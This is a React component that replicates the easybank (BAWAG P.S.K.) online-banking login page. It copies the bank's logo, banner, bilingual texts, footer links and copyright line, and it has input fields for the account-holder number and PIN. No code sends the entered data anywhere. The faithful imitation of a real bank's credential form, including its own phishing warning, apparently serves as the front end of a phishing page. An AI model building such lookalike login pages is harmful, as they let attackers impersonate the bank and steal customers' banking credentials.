import { useState, useEffect, useRef, useCallback } from "react";
import { Eye, EyeOff, ChevronRight } from "lucide-react";
import easybankLogo from "@/assets/logo-easybank_de.png";
import easybankBanner from "@/assets/EASY26016_login.jpg";

type Lang = "DE" | "EN";

const translations: Record<Lang, {
  days: string[];
  hilfe: string;
  loginTitle: string;
  loginHilfe: string;
  loginQuestion: string;
  tabVerfueger: string;
  tabApp: string;
  verfuegerLabel: string;
  verfuegerHint: string;
  pinLabel: string;
  pinHint: string;
  loginBtn: string;
  unlockLink: string;
  appText: string;
  appInputLabel: string;
  appBtn: string;
  warnungTitle: string;
  warnungBold: string;
  warnungText: string;
  warnungLink: string;
  hilfeTitle: string;
  hilfePin: string;
  hilfeFaq: string;
  infoTitle: string;
  infoDebit: string;
  infoApp: string;
  infoWatchlist: string;
  footer: string[];
  tooltipTitle: string;
  tooltipText: string;
}> = {
  DE: {
    days: ["Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"],
    hilfe: "Hilfe",
    loginTitle: "Login mit Zugangsdaten",
    loginHilfe: "Hilfe",
    loginQuestion: "Wie wollen Sie sich einloggen?",
    tabVerfueger: "Verfüger",
    tabApp: "Mit der App",
    verfuegerLabel: "Verfügernummer",
    verfuegerHint: "Verfüger ohne führende Nullen!",
    pinLabel: "PIN",
    pinHint: "8 bis 16-stellig",
    loginBtn: "Login",
    unlockLink: "eBanking Zugang entsperren",
    appText: "Verwenden Sie Ihre für die easybank app registrierte E-Mail oder Ihre Verfügernummer.",
    appInputLabel: "E-Mail ODER Verfügernummer",
    appBtn: "Weiter",
    warnungTitle: "Warnung",
    warnungBold: "Achtung vor Phishing",
    warnungText: "Wir fordern Sie niemals per E-Mail oder SMS auf, TANs, Konto- und Kreditkarten-Daten einzugeben oder zu bestätigen!",
    warnungLink: "Weiterlesen",
    hilfeTitle: "Hilfe/Hotline",
    hilfePin: "PIN vergessen oder Verfüger gesperrt?",
    hilfeFaq: "FAQ",
    infoTitle: "Info",
    infoDebit: "Bestellung PIN-Code für Debitkarte",
    infoApp: "Alle Infos zur\neasybank App",
    infoWatchlist: "Zu Watchlist Internet",
    footer: ["Impressum", "AGB", "Datenschutz", "Nutzungsbedingungen", "Barrierefrei"],
    tooltipTitle: "Login",
    tooltipText: "Melden Sie sich mit Ihren eBanking Zugangsdaten (mit Verfügernummer und PIN) oder per App (mit Verfügernummer oder email-Adresse) an.",
  },
  EN: {
    days: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
    hilfe: "Help",
    loginTitle: "Login with access data",
    loginHilfe: "Help",
    loginQuestion: "How do you want to log in?",
    tabVerfueger: "Disposer",
    tabApp: "With the app",
    verfuegerLabel: "Disposer number",
    verfuegerHint: "Disposer without leading zeros!",
    pinLabel: "PIN",
    pinHint: "8 - 16 characters",
    loginBtn: "Login",
    unlockLink: "Unlock eBanking access",
    appText: "Use your email registered for the easybank app or your disposer number.",
    appInputLabel: "Email OR Disposer number",
    appBtn: "Continue",
    warnungTitle: "Warning",
    warnungBold: "Phishing alert",
    warnungText: "We will never ask you by email or SMS to enter or confirm TANs, account or credit card data!",
    warnungLink: "Read more",
    hilfeTitle: "Help/Hotline",
    hilfePin: "Forgot PIN or disposer locked?",
    hilfeFaq: "FAQ",
    infoTitle: "Info",
    infoDebit: "Order PIN code for debit card",
    infoApp: "All info about the\neasybank App",
    infoWatchlist: "To Watchlist Internet",
    footer: ["Imprint", "Terms and Conditions", "Data Protection", "Terms of Use", "Barrier Free"],
    tooltipTitle: "Login",
    tooltipText: "Log in with your eBanking access data (with disposer number and PIN) or via app (with disposer number or email address).",
  },
};

const BASE_WIDTH = 970;

const footerUrls = [
  "https://www.easybank.at/impressum",
  "https://www.easybank.at/agb",
  "https://www.easybank.at/datenschutz",
  "https://www.easybank.at/nutzungsbedingungen",
  "https://www.easybank.at/barrierefreiheit",
];

const RedWarningIcon = () => (
  <svg width="20" height="18" viewBox="0 0 20 18" fill="none" xmlns="http://www.w3.org/2000/svg" className="flex-shrink-0 mt-0.5">
    <path d="M10 0L20 18H0L10 0Z" fill="#cc0000" />
    <text x="10" y="14" textAnchor="middle" fill="white" fontSize="12" fontWeight="bold" fontFamily="Arial">!</text>
  </svg>
);

const Easybank = () => {
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [appInput, setAppInput] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [lang, setLang] = useState<Lang>("DE");
  const [activeTab, setActiveTab] = useState<"verfueger" | "app">("verfueger");
  const [scale, setScale] = useState(1);
  const [showHilfeTooltip, setShowHilfeTooltip] = useState(false);
  const contentRef = useRef<HTMLDivElement>(null);
  const [contentHeight, setContentHeight] = useState(0);

  const updateScale = useCallback(() => {
    const s = Math.min(1, window.innerWidth / BASE_WIDTH);
    setScale(s);
  }, []);

  useEffect(() => {
    updateScale();
    window.addEventListener("resize", updateScale);
    return () => window.removeEventListener("resize", updateScale);
  }, [updateScale]);

  useEffect(() => {
    if (contentRef.current) {
      setContentHeight(contentRef.current.scrollHeight);
    }
  });

  const t = translations[lang];
  const now = new Date();
  const dateStr = `${t.days[now.getDay()]}, ${String(now.getDate()).padStart(2, "0")}.${String(now.getMonth() + 1).padStart(2, "0")}.${now.getFullYear()} - ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;

  const scaledWidth = BASE_WIDTH * scale;
  const scaledHeight = contentHeight ? contentHeight * scale : undefined;

  return (
    <div
      className="min-h-screen bg-white overflow-x-hidden flex justify-center"
      style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
    >
      <div style={{ width: `${scaledWidth}px`, height: scaledHeight ? `${scaledHeight}px` : undefined }}>
        <div
          ref={contentRef}
          style={{
            width: `${BASE_WIDTH}px`,
            transform: `scale(${scale})`,
            transformOrigin: "top left",
          }}
        >
          {/* Header */}
          <header className="bg-white px-4 py-2">
            {/* Row 1: Hilfe + Sprachauswahl rechts oben */}
            <div className="flex items-center justify-end gap-3">
              <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:underline">
                {t.hilfe}
              </a>
              <select
                value={lang}
                onChange={(e) => setLang(e.target.value as Lang)}
                className="text-[11px] border border-gray-300 rounded px-1 py-0.5 bg-white text-gray-700 cursor-pointer focus:outline-none"
              >
                <option value="DE">deutsch</option>
                <option value="EN">english</option>
              </select>
            </div>
            {/* Row 2: Logo links + Datum rechts */}
            <div className="flex items-center justify-between">
              <img src={easybankLogo} alt="easybank" className="h-20" />
              <span className="text-[11px] text-black">{dateStr}</span>
            </div>
          </header>

          {/* Main content */}
          <div className="flex gap-4 p-4" style={{ minHeight: "520px" }}>
            {/* Left: Login Card */}
            <div className="w-[370px] flex-shrink-0">
              <div className="border border-black rounded bg-white">
                {/* Card header */}
                <div className="px-4 py-3 bg-[#ecf4dc] flex items-center justify-between rounded-t relative">
                  <h1 className="text-sm font-semibold text-black">{t.loginTitle}</h1>
                  <a
                    href="#"
                    onClick={(e) => { e.preventDefault(); setShowHilfeTooltip(!showHilfeTooltip); }}
                    className="text-xs text-black underline hover:no-underline"
                  >
                    {t.loginHilfe}
                  </a>
                  {showHilfeTooltip && (
                    <div className="absolute left-full top-0 ml-1 z-50 w-[300px] bg-white border border-gray-300 rounded shadow-lg">
                      <div className="px-3 py-2 text-sm font-semibold text-[#177991]">{t.tooltipTitle}</div>
                      <div className="h-[1px] bg-gray-300" />
                      <div className="px-3 py-2 text-xs text-black leading-relaxed">{t.tooltipText}</div>
                    </div>
                  )}
                </div>

                <div className="p-4">
                  {/* Question */}
                  <p className="text-xs text-black mb-3">{t.loginQuestion}</p>

                  {/* Tabs */}
                  <div className="mb-4 border-b border-gray-300">
                    <div className="flex">
                      <button
                        onClick={() => setActiveTab("verfueger")}
                        className={`px-4 py-2 text-xs font-semibold transition-colors relative ${
                          activeTab === "verfueger"
                            ? "text-[#177991]"
                            : "text-gray-500 hover:text-black"
                        }`}
                      >
                        {t.tabVerfueger}
                        {activeTab === "verfueger" && (
                          <span className="absolute bottom-0 left-0 right-0 h-[2px] bg-[#177991]" />
                        )}
                      </button>
                      <button
                        onClick={() => setActiveTab("app")}
                        className={`px-4 py-2 text-xs font-semibold transition-colors relative ${
                          activeTab === "app"
                            ? "text-[#177991]"
                            : "text-gray-500 hover:text-black"
                        }`}
                      >
                        {t.tabApp}
                        {activeTab === "app" && (
                          <span className="absolute bottom-0 left-0 right-0 h-[2px] bg-[#177991]" />
                        )}
                      </button>
                    </div>
                  </div>

                  {activeTab === "verfueger" ? (
                    <div>
                      {/* Verfügernummer */}
                      <div className="mb-3 flex items-start gap-2">
                        <label className="text-sm font-semibold text-black pt-1.5 w-[130px] flex-shrink-0">{t.verfuegerLabel}</label>
                        <div className="flex-1">
                          <input
                            type="text"
                            value={verfueger}
                            onChange={(e) => setVerfueger(e.target.value)}
                            className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#177991]"
                          />
                          <p className="text-[10px] text-black mt-1">{t.verfuegerHint}</p>
                        </div>
                      </div>

                      {/* PIN */}
                      <div className="mb-4 flex items-start gap-2">
                        <label className="text-sm font-semibold text-black pt-1.5 w-[130px] flex-shrink-0">{t.pinLabel}</label>
                        <div className="flex-1">
                          <div className="relative">
                            <input
                              type={showPin ? "text" : "password"}
                              value={pin}
                              onChange={(e) => setPin(e.target.value)}
                              className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#177991]"
                            />
                            <button
                              type="button"
                              onClick={() => setShowPin(!showPin)}
                              className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                            >
                              {showPin ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                            </button>
                          </div>
                          <p className="text-[10px] text-black mt-1">{t.pinHint}</p>
                        </div>
                      </div>

                      {/* Login button */}
                      <div className="flex justify-end mb-4">
                        <button className="px-4 py-1.5 bg-[#177991] text-white text-xs font-semibold rounded hover:bg-[#126a7d] transition-colors">
                          {t.loginBtn}
                        </button>
                      </div>

                      {/* Unlock link */}
                      <div className="pt-3">
                        <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold flex items-center gap-1">
                          <ChevronRight className="h-3 w-3" />
                          {t.unlockLink}
                        </a>
                      </div>
                    </div>
                  ) : (
                    <div>
                      <p className="text-xs text-black mb-3">{t.appText}</p>
                      <div className="mb-3 flex items-start gap-2">
                        <label className="text-sm font-semibold text-black pt-1.5 w-[130px] flex-shrink-0">{t.appInputLabel}</label>
                        <div className="flex-1">
                          <input
                            type="text"
                            value={appInput}
                            onChange={(e) => setAppInput(e.target.value)}
                            className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#177991]"
                          />
                        </div>
                      </div>
                      <div className="flex justify-end mb-4">
                        <button className="px-4 py-1.5 bg-[#177991] text-white text-xs font-semibold rounded hover:bg-[#126a7d] transition-colors">
                          {t.appBtn}
                        </button>
                      </div>
                      <div className="pt-3">
                        <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold flex items-center gap-1">
                          <ChevronRight className="h-3 w-3" />
                          {t.unlockLink}
                        </a>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Right side */}
            <div className="flex-1 flex flex-col gap-4">
              {/* 3 info cards */}
              <div className="flex gap-4 items-start">
                {/* Warnung */}
                <div className="flex-1 border border-gray-300 rounded bg-white flex flex-col min-h-[220px]">
                  <div className="px-3 py-2">
                    <h2 className="text-[#008080] text-base font-normal">{t.warnungTitle}</h2>
                  </div>
                  <div className="h-[2px] bg-[#f6f6f6]" />
                  <div className="p-3 flex-1">
                    <div className="flex gap-2">
                      <RedWarningIcon />
                      <div>
                        {lang === "DE" ? (
                          <p className="text-xs text-black leading-snug">
                            <strong>{"Achtung vor"}<br />{"Phishing"}</strong>
                            <br />
                            {"Wir fordern Sie"}<br />
                            {"niemals per E-Mail"}<br />
                            {"oder SMS auf, TANs,"}<br />
                            {"Konto- und"}<br />
                            {"Kreditkarten-Daten"}<br />
                            {"einzugeben oder zu"}<br />
                            {"bestätigen!"}
                          </p>
                        ) : (
                          <p className="text-xs text-black leading-snug">
                            <strong>{t.warnungBold}</strong>
                            <br />
                            {t.warnungText}
                          </p>
                        )}
                      </div>
                    </div>
                    <div className="ml-[28px]">
                      <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-[#4b9920] underline hover:no-underline">
                        {t.warnungLink}
                      </a>
                    </div>
                  </div>
                </div>

                {/* Hilfe + Info Wrapper — gleiche Tiefe */}
                <div className="flex-[2] flex gap-4 items-stretch">
                  {/* Hilfe/Hotline */}
                  <div className="flex-1 border border-gray-300 rounded bg-white flex flex-col">
                    <div className="px-3 py-2">
                      <h2 className="text-[#008080] text-base font-normal">{t.hilfeTitle}</h2>
                    </div>
                    <div className="h-[2px] bg-[#f6f6f6]" />
                    <div className="p-3 flex-1">
                      <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                        <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                        {t.hilfePin}
                      </a>
                      <div className="h-[1px] bg-[#f6f6f6] -mx-3" />
                      <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                        <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                        {t.hilfeFaq}
                      </a>
                    </div>
                  </div>
                  {/* Info */}
                  <div className="flex-1 border border-gray-300 rounded bg-white flex flex-col">
                    <div className="px-3 py-2">
                      <h2 className="text-[#008080] text-base font-normal">{t.infoTitle}</h2>
                    </div>
                    <div className="h-[2px] bg-[#f6f6f6]" />
                    <div className="p-3 flex-1">
                      <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                        <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                        <span className="font-bold">{t.infoDebit}</span>
                      </a>
                      <div className="h-[1px] bg-[#f6f6f6] -mx-3" />
                      <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all whitespace-pre-line">
                        <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                        {t.infoApp}
                      </a>
                      <div className="h-[1px] bg-[#f6f6f6] -mx-3" />
                      <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                        <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                        {t.infoWatchlist}
                      </a>
                    </div>
                  </div>
                </div>
              </div>

              {/* Banner */}
              <div className="flex-1">
                <img
                  src={easybankBanner}
                  alt="easybank Freunde empfehlen"
                  className="w-full rounded cursor-pointer"
                  onClick={() => {}}
                />
              </div>
            </div>
          </div>

          {/* Footer */}
          <footer className="bg-white border-t border-gray-200 py-3 px-4">
            <div className="flex flex-wrap gap-3 justify-center">
              {t.footer.map((item, index) => (
                <a key={item} href={footerUrls[index]} target="_blank" rel="noopener noreferrer" className="text-[11px] text-black underline hover:text-[#8ab528] transition-colors">
                  {item}
                </a>
              ))}
              <span className="text-[11px] text-black">© BAWAG P.S.K.</span>
            </div>
          </footer>
        </div>
      </div>
    </div>
  );
};

export default Easybank;
